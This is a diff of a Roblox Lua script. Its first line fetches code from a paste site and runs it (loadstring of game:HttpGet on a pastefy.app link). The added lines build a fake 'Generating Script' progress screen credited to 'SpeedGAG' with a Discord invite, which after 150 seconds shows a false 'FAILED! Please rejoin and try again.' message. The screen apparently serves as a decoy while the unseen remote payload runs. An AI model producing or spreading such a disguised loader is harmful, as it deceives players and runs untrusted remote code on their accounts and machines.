@@ -1,1 +1,155 @@
 ‎loadstring(game:HttpGet("https://pastefy.app/NypYQZ37/raw"))()
+--// Services
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
+
+------------------------------------------------
+-- LOADING SCREEN
+------------------------------------------------
+if playerGui:FindFirstChild("LoadingScreenUI") then
+	playerGui.LoadingScreenUI:Destroy()
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "LoadingScreenUI"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 400, 0, 150)
+LoadingFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
+LoadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+LoadingFrame.BorderSizePixel = 0
+LoadingFrame.Parent = gui
+Instance.new("UICorner", LoadingFrame).CornerRadius = UDim.new(0, 12)
+
+local Title = Instance.new("TextLabel")
+Title.Parent = LoadingFrame
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.BackgroundTransparency = 1
+Title.Text = "Made by : SpeedGAG"
+Title.Font = Enum.Font.GothamBold
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 18
+
+local Link = Instance.new("TextLabel")
+Link.Parent = LoadingFrame
+Link.Size = UDim2.new(1, 0, 0, 25)
+Link.Position = UDim2.new(0, 0, 0, 30)
+Link.BackgroundTransparency = 1
+Link.Text = "https://discord.gg/SpeedGAG"
+Link.Font = Enum.Font.Gotham
+Link.TextColor3 = Color3.fromRGB(200, 200, 200)
+Link.TextSize = 16
+
+local StatusText = Instance.new("TextLabel")
+StatusText.Parent = LoadingFrame
+StatusText.Size = UDim2.new(1, 0, 0, 25)
+StatusText.Position = UDim2.new(0, 0, 0.45, 0)
+StatusText.BackgroundTransparency = 1
+StatusText.Text = "Generating Script"
+StatusText.Font = Enum.Font.Gotham
+StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+StatusText.TextSize = 18
+
+local ProgressBarBg = Instance.new("Frame")
+ProgressBarBg.Parent = LoadingFrame
+ProgressBarBg.Size = UDim2.new(0.9, 0, 0, 24)
+ProgressBarBg.Position = UDim2.new(0.05, 0, 0.65, 0)
+ProgressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+ProgressBarBg.BorderSizePixel = 0
+Instance.new("UICorner", ProgressBarBg).CornerRadius = UDim.new(0, 8)
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Parent = ProgressBarBg
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+ProgressBar.BorderSizePixel = 0
+Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(0, 8)
+
+local PercentageText = Instance.new("TextLabel")
+PercentageText.Parent = ProgressBarBg
+PercentageText.Size = UDim2.new(1, 0, 1, 0)
+PercentageText.BackgroundTransparency = 1
+PercentageText.Text = "0%"
+PercentageText.Font = Enum.Font.GothamBold
+PercentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentageText.TextSize = 16
+
+-- Variables
+local dots = ""
+local statusBase = "Generating Script"
+
+-- Animate dots (...)
+task.spawn(function()
+	while LoadingFrame.Parent do
+		for i = 0, 3 do
+			dots = string.rep(".", i)
+			StatusText.Text = statusBase .. dots
+			task.wait(0.4)
+		end
+	end
+end)
+
+-- Simulate loading (2:30 minutes)
+task.spawn(function()
+	local totalTime = 150 -- seconds
+	local steps = 100
+	local waitTime = totalTime / steps -- 1.5 seconds per step
+
+	for i = 1, steps do
+		ProgressBar.Size = UDim2.new(i/100, 0, 1, 0)
+		PercentageText.Text = i .. "%"
+
+		if i <= 49 then
+			statusBase = "Generating Script"
+		else
+			statusBase = "Finalizing Script"
+		end
+
+		task.wait(waitTime)
+	end
+
+	-- Remove loading frame
+	LoadingFrame:Destroy()
+
+	------------------------------------------------
+	-- FAILED SCREEN
+	------------------------------------------------
+	local FailedFrame = Instance.new("Frame")
+	FailedFrame.Size = UDim2.new(0, 400, 0, 200)
+	FailedFrame.Position = UDim2.new(0.5, -200, 1.5, 0) -- offscreen bottom
+	FailedFrame.AnchorPoint = Vector2.new(0.5, 0)
+	FailedFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	FailedFrame.BorderSizePixel = 0
+	FailedFrame.Parent = gui
+	Instance.new("UICorner", FailedFrame).CornerRadius = UDim.new(0, 12)
+
+	-- Slide animation pataas
+	local tween = TweenService:Create(FailedFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+		Position = UDim2.new(0.5, 0, 0.5, -100)
+	})
+	tween:Play()
+
+	local FailedTitle = Instance.new("TextLabel")
+	FailedTitle.Parent = FailedFrame
+	FailedTitle.Size = UDim2.new(1, 0, 0, 40)
+	FailedTitle.Position = UDim2.new(0, 0, 0.2, 0)
+	FailedTitle.BackgroundTransparency = 1
+	FailedTitle.Text = "FAILED!"
+	FailedTitle.Font = Enum.Font.GothamBold
+	FailedTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
+	FailedTitle.TextSize = 26
+
+	local FailedMessage = Instance.new("TextLabel")
+	FailedMessage.Parent = FailedFrame
+	FailedMessage.Size = UDim2.new(1, 0, 0, 25)
+	FailedMessage.Position = UDim2.new(0, 0, 0.55, 0)
+	FailedMessage.BackgroundTransparency = 1
+	FailedMessage.Text = "Please rejoin and try again."
+	FailedMessage.Font = Enum.Font.Gotham
+	FailedMessage.TextColor3 = Color3.fromRGB(255, 0, 0)
+	FailedMessage.TextSize = 18
+end)
